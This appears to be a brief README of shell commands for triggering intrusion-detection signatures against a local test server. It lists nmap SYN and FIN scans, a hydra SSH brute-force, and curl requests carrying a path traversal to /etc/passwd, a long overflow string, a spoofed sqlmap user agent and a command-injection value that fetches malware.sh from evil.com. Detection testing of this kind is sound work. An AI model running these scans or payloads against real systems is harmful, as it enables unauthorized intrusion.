# Scan Signature demo
```bash
sudo apt install nmap
```
```bash
nmap [subnet]
```
```bash
nmap -p 22,80,443 [ip address]
```
```bash
sudo nmap -sS [ip address]
```
```bash
sudo nmap -sF [ip address]
```

# Brute force Signature demo

```bash
sudo apt install hydra
```
```bash
hydra -l [username] -P /path/to/passwords.txt ssh://[ip address]
```
## Exploit Signature demo 

```bash
curl -A "sqlmap/1.5" http://[ip address]:[port]/test
```
```bash
curl http://[ip address]:[port]/etc/passwd
```
```bash
curl http://[ip address]:[port]/etc/passwd
```
```bash
curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")
```
```bash
curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")
```
```bash
curl "http://[ip address]:[port]/?input=hello%3Bwget%20http://evil.com/malware.sh"
```

## Server side prepare
```bash
python3 -m http.server [port]
```